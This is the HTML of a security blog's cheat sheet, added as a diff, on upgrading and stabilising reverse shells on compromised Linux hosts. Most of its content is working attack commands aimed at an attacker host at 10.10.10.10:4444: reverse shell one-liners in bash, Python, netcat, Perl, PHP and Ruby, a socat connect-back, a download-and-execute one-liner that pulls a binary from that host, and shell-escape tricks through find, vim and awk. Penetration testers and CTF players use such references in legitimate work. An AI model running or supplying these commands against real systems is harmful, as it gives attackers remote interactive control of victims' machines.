@@ -1,0 +1,300 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Docs
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+<div class="row page">
+	<!-- cols -->
+	
+	<div class="col-md-12"> 
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Linux-Shell-Upgrade-and-Stabilization"><a href="#Linux-Shell-Upgrade-and-Stabilization" class="headerlink" title="Linux Shell Upgrade and Stabilization"></a>Linux Shell Upgrade and Stabilization</h1><p>Upgrade basic reverse shells to fully interactive TTY shells with tab completion, command history, and signal handling.<br>Proper shell stabilization is critical for effective post-exploitation and prevents accidental disconnections.</p>
+<h2 id="Quick-Reference"><a href="#Quick-Reference" class="headerlink" title="Quick Reference"></a>Quick Reference</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python PTY upgrade</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># Ctrl+Z</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"></span><br><span class="line"><span class="comment"># Socat full TTY (best method)</span></span><br><span class="line"><span class="comment"># Attacker:</span></span><br><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br><span class="line"><span class="comment"># Victim:</span></span><br><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444</span><br></pre></td></tr></table></figure>
+
+<h2 id="Reverse-Shell-One-Liners"><a href="#Reverse-Shell-One-Liners" class="headerlink" title="Reverse Shell One-Liners"></a>Reverse Shell One-Liners</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Bash TCP</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1</span><br><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python</span></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.10&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Netcat</span></span><br><span class="line">nc -e /bin/sh 10.10.10.10 4444</span><br><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4444 &gt;/tmp/f</span><br><span class="line"></span><br><span class="line"><span class="comment"># Perl</span></span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.10.10.10&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.10.10.10&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ruby</span></span><br><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.10.10.10&quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Python-PTY-Upgrade"><a href="#Python-PTY-Upgrade" class="headerlink" title="Python PTY Upgrade"></a>Python PTY Upgrade</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Spawn PTY</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Background shell (Ctrl+Z)</span></span><br><span class="line">^Z</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Configure terminal</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line"><span class="comment"># Press Enter twice</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Set environment variables</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"><span class="built_in">export</span> SHELL=bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 5: Fix terminal size</span></span><br><span class="line"><span class="built_in">stty</span> rows 38 columns 116  <span class="comment"># Get values from: stty -a</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Socat-Full-TTY-Upgrade"><a href="#Socat-Full-TTY-Upgrade" class="headerlink" title="Socat Full TTY Upgrade"></a>Socat Full TTY Upgrade</h2><h3 id="Method-1-Socat-Binary-Available"><a href="#Method-1-Socat-Binary-Available" class="headerlink" title="Method 1: Socat Binary Available"></a>Method 1: Socat Binary Available</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Attacker listener</span></span><br><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># Victim connection</span></span><br><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444</span><br></pre></td></tr></table></figure>
+
+<h3 id="Method-2-Transfer-Socat-Binary"><a href="#Method-2-Transfer-Socat-Binary" class="headerlink" title="Method 2: Transfer Socat Binary"></a>Method 2: Transfer Socat Binary</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Download socat static binary</span></span><br><span class="line">wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat</span><br><span class="line"></span><br><span class="line"><span class="comment"># Serve from attacker</span></span><br><span class="line">python3 -m http.server 8000</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download on victim</span></span><br><span class="line">wget http://10.10.10.10:8000/socat -O /tmp/socat</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/socat</span><br><span class="line"></span><br><span class="line"><span class="comment"># Connect back</span></span><br><span class="line">/tmp/socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444</span><br></pre></td></tr></table></figure>
+
+<h3 id="One-Liner-Download-and-Execute"><a href="#One-Liner-Download-and-Execute" class="headerlink" title="One-Liner Download and Execute"></a>One-Liner Download and Execute</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -q http://10.10.10.10/socat -O /tmp/socat; <span class="built_in">chmod</span> +x /tmp/socat; /tmp/socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444</span><br></pre></td></tr></table></figure>
+
+<h2 id="Alternative-Shell-Spawning-Methods"><a href="#Alternative-Shell-Spawning-Methods" class="headerlink" title="Alternative Shell Spawning Methods"></a>Alternative Shell Spawning Methods</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /bin/sh interactive</span></span><br><span class="line">/bin/sh -i</span><br><span class="line"></span><br><span class="line"><span class="comment"># Perl</span></span><br><span class="line">perl -e <span class="string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ruby</span></span><br><span class="line">ruby -e <span class="string">&#x27;exec &quot;/bin/sh&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Lua</span></span><br><span class="line">lua -e <span class="string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># AWK</span></span><br><span class="line">awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Find with exec</span></span><br><span class="line">find / -name nameoffile -<span class="built_in">exec</span> /bin/awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span> \;</span><br><span class="line">find . -<span class="built_in">exec</span> /bin/sh \; -quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># VIM</span></span><br><span class="line">vim -c <span class="string">&#x27;:!/bin/sh&#x27;</span></span><br><span class="line"><span class="comment"># Or from within vim:</span></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># Expect</span></span><br><span class="line">expect -c <span class="string">&#x27;spawn /bin/sh;interact&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="rlwrap-for-Better-Netcat-Shells"><a href="#rlwrap-for-Better-Netcat-Shells" class="headerlink" title="rlwrap for Better Netcat Shells"></a>rlwrap for Better Netcat Shells</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Use rlwrap with netcat listener</span></span><br><span class="line">rlwrap nc -lvnp 4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># Provides:</span></span><br><span class="line"><span class="comment"># - Command history (up/down arrows)</span></span><br><span class="line"><span class="comment"># - Line editing</span></span><br><span class="line"><span class="comment"># - Tab completion (limited)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Script-Command-for-Logging"><a href="#Script-Command-for-Logging" class="headerlink" title="Script Command for Logging"></a>Script Command for Logging</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Start script to log session</span></span><br><span class="line">script /dev/null -c bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Or</span></span><br><span class="line">script -qc /bin/bash /dev/null</span><br></pre></td></tr></table></figure>
+
+<h2 id="Common-Workflow"><a href="#Common-Workflow" class="headerlink" title="Common Workflow"></a>Common Workflow</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Catch reverse shell</span></span><br><span class="line">nc -lvnp 4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Upgrade to PTY</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Background and configure</span></span><br><span class="line">^Z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">[Enter] [Enter]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Set environment</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"><span class="built_in">export</span> SHELL=bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 5: Fix terminal size (get from local: stty -a)</span></span><br><span class="line"><span class="built_in">stty</span> rows 38 columns 116</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 6: Test functionality</span></span><br><span class="line"><span class="comment"># - Tab completion</span></span><br><span class="line"><span class="comment"># - Ctrl+C (should work)</span></span><br><span class="line"><span class="comment"># - Command history (up arrow)</span></span><br><span class="line"><span class="comment"># - Clear screen (Ctrl+L)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><p><strong>Why Upgrade Shells?</strong></p>
+<p>Basic reverse shells lack:</p>
+<ul>
+<li>Tab completion</li>
+<li>Command history</li>
+<li>Signal handling (Ctrl+C kills shell)</li>
+<li>Proper terminal emulation</li>
+<li>Text editors (vim, nano) don’t work properly</li>
+<li>Job control (background processes)</li>
+</ul>
+<p><strong>PTY vs TTY:</strong></p>
+<ul>
+<li><strong>PTY (Pseudo-Terminal)</strong>: Software emulation of terminal</li>
+<li><strong>TTY (Teletypewriter)</strong>: Physical or virtual terminal device</li>
+<li>PTY provides TTY-like functionality in reverse shells</li>
+</ul>
+<p><strong>Socat Advantages:</strong></p>
+<ul>
+<li>Full terminal emulation</li>
+<li>Signal handling (Ctrl+C, Ctrl+Z)</li>
+<li>Proper terminal size</li>
+<li>Works with interactive programs</li>
+<li>Best method when available</li>
+</ul>
+<p><strong>Terminal Size Issues:</strong></p>
+<p>If terminal size is wrong:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># On attacker machine</span></span><br><span class="line"><span class="built_in">stty</span> -a  <span class="comment"># Note rows and columns</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line"><span class="built_in">stty</span> rows &lt;num&gt; columns &lt;num&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Common Issues:</strong></p>
+<ol>
+<li><strong>Shell dies on Ctrl+C</strong>: Not properly upgraded</li>
+<li><strong>No tab completion</strong>: PTY not spawned</li>
+<li><strong>Weird characters</strong>: TERM not set</li>
+<li><strong>Text wrapping issues</strong>: Terminal size not set</li>
+<li><strong>Vim&#x2F;nano broken</strong>: Need full TTY (use socat)</li>
+</ol>
+<p><strong>Best Practices:</strong></p>
+<ul>
+<li>Always upgrade shells immediately</li>
+<li>Use socat when possible (best stability)</li>
+<li>Set TERM and SHELL variables</li>
+<li>Configure terminal size</li>
+<li>Test tab completion and Ctrl+C</li>
+<li>Keep socat binary in toolkit</li>
+</ul>
+<p><strong>Alternative Tools:</strong></p>
+<ul>
+<li><strong>pwncat-cs</strong>: Automated shell upgrade and management</li>
+<li><strong>rlwrap</strong>: Simple wrapper for better line editing</li>
+<li><strong>script</strong>: Log session and improve terminal</li>
+</ul>
+<p><strong>Checking Available Interpreters:</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">which</span> python python2 python3</span><br><span class="line"><span class="built_in">which</span> perl ruby lua</span><br><span class="line"><span class="built_in">which</span> awk</span><br></pre></td></tr></table></figure>
+
+<p><strong>Permissions Considerations:</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check file permissions</span></span><br><span class="line"><span class="built_in">ls</span> -la /path/to/binary</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check sudo permissions</span></span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check SUID binaries</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><strong>Resources:</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">ropnop’s Shell Upgrade Guide</a></li>
+<li><a target="_blank" rel="noopener" href="https://0xffsec.com/handbook/shells/full-tty/">0xffsec Handbook</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries">Static Binaries Repository</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
